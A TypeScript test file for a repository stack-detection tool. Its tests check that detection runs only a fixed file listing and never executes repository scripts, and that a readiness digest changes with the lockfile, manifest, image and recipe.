test("nothing from the repository is executed: only the two fixed reads reach the executor", async () => {
  const { root, executor } = await materialise({ ...NODE_PNPM, "touch-me.sh": "touch EXECUTED\n" });
  const commands: string[] = [];
  const spy: AgentExecutor = {
    exec: (command, options) => { commands.push(command); return executor.exec(command, options); },
    putFile: () => { throw new Error("detection must not write"); },
    getFile: (path) => executor.getFile(path),
    destroy: () => executor.destroy(),
  };
  try {
    await proposeFromExecutor(spy);
    assert.equal(commands.length, 1);
    assert.match(commands[0]!, /^find \. /);
    const proposed = Object.values((await proposeFromExecutor(spy)).detection.proposals).map((x) => x?.command ?? "");
    assert.ok(proposed.length > 0);
    assert.equal(commands.length, 2, "one listing per proposeFromExecutor call, nothing else");
    for (const c of proposed) assert.ok(!commands.some((ran) => ran.includes(c)), `proposed command ${c} was run`);
    const check = await executor.exec("test -e EXECUTED && echo yes || echo no");
    assert.equal(check.stdout.trim(), "no");
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test("digest: stable for identical trees, changes with a lockfile byte, a manifest byte, the image, or the recipe", async () => {
  const a = await propose(NODE_PNPM);
  const b = await propose(NODE_PNPM);
  assert.equal(readinessDigestOf(a), readinessDigestOf(b));
  const lock = await propose({ ...NODE_PNPM, "pnpm-lock.yaml": "lockfileVersion: '9.0'\n# x\n" });
  assert.notEqual(readinessDigestOf(a), readinessDigestOf(lock));
  const man = await propose({ ...NODE_PNPM, "package.json": NODE_PNPM["package.json"]!.replace("vitest run", "vitest") });
  assert.notEqual(readinessDigestOf(a), readinessDigestOf(man));
  const read = { files: Object.keys(NODE_PNPM).filter((f) => !f.startsWith("node_modules")), manifests: { "package.json": NODE_PNPM["package.json"]!, ".nvmrc": NODE_PNPM[".nvmrc"]! }, lockfiles: { "pnpm-lock.yaml": NODE_PNPM["pnpm-lock.yaml"]! }, notes: [] };
  assert.notEqual(proposeFromRead(read).recipeDigest?.digest, proposeFromRead(read, { image: "node:22" }).recipeDigest?.digest, "image is part of the basis");
  // The recipe is part of the digest: same inputs, different recipe => different digest.
  const det = detectStack({ files: read.files, manifests: read.manifests });
  const r1 = recipeFromDetection(det, ["pnpm-lock.yaml"]);
  const r2 = recipeFromDetection(det, ["pnpm-lock.yaml", "extra.lock"]);
  assert.notEqual(r1.canonical, r2.canonical);
});

